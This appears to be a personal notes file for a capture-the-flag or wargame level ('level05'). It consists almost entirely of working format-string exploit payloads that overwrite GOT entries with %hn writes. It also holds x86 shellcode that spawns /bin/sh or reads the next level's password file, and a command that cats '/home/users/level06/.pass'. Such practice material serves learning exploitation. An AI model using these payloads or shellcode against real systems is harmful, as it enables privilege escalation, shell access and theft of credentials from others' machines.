
# "exit 0" 0xf7f897f4

# to write:
#	0068 -> 0xf7f897fa
#   622f -> 0xf7f897f4
#	6e69 -> 0xf7f897f6
#	732f -> 0xf7f897f8
#   f7e6 -> 0x080497e2
#   aed0 -> 0x080497e0
# or:
#   ffff -> 0x080497e2
#   d5ec -> 0x080497e0 # should be e8 but I go for more and will put nopslide

#

# ./level05 < <(python -c 'print("\xfa\x97\xf8\xf7"+"0000"+"\xf4\x97\xf8\xf7"+"1111"+"\xf6\x97\xf8\xf7"+"2222"+"\xf8\x97\xf8\xf7"+"3333"+"\xe0\x97\x04\x08"+"aaaa"+"\xe2\x97\x04\x08"+"%c" * 8+"%68c"+"%hn"+"%c" * 8+"%44692c"+"%hn"+"%18710c"+"%hn")')


# export SHELLCODE=$(python -c 'print("\x90" * 20 + "\x6a\x01" * 10 + "\x6a\x73" +"\x68\x2e\x70\x61\x73" +"\x68\x30\x36\x2f\x2f" +"\x68\x65\x76\x65\x6c" +"\x68\x72\x73\x2f\x6c" +"\x68\x2f\x75\x73\x65" +"\x68\x68\x6f\x6d\x65" +"\x68\x2f\x2f\x2f\x2f" +"\x31\xc0" +"\x31\xd2" +"\x31\xc9" +"\x31\xdb" +"\xb0\x05" +"\x89\xe3" +"\xb1\x02" +"\xb2\x01" +"\xcd\x80" +"\x89\xc3" +"\xb0\x03" +"\x89\xe1" +"\xb2\x29" +"\xcd\x80" +"\xb0\x04" +"\xb3\x01" +"\x89\xe1" +"\xb2\x29" +"\xcd\x80" +"\xb0\x01" +"\xcd\x80")')

export SHELLCODE=$(python -c 'print("\x90" * 20 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")')

./level05 < <(python -c 'print("\xe0\x97\x04\x08" + "aaaa" + "\xe2\x97\x04\x08" + "%c" * 8 + "%54744c" + "%hn" + "%10771c" + "%hn" + "\x90" * 28 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")')


# Redirects to the system() function but then I need to make it execute /bin/sh
./level05 < <(python -c 'print("\xe0\x97\x04\x08" + "aaaa" + "\xe2\x97\x04\x08" + "%c" * 8 + "%44732c" + "%hn" + "%18710c" + "%hn")')

env -i SHELLCODE=$SHELLCODE ./level05 < <(python -c 'print("\xe0\x97\x04\x08" + "aaaa" + "\xe2\x97\x04\x08" + "%c%c%c%c%c%c%c%c" + "%57280c" + "%hn" + "%8235c" + "%hn" + "cat /home/users/level06/.pass ;" * 200)')

# env 0xffffe847
# system 0xf7e6aed0